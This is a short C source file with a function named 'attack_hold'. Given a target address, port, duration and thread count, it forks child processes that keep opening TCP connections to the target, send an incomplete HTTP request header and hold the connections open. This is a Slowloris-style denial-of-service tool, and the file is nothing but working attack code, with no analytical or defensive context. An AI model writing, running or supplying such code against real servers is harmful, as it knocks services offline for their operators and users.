#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void attack_hold(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            while (time(NULL) < end) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target, &addr.sin_addr);

                if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                    send(sock, "GET / HTTP/1.1\r\nHost: ", 22, 0);
                    sleep(10);
                }
                close(sock);
            }
            exit(0);
        }
    }
}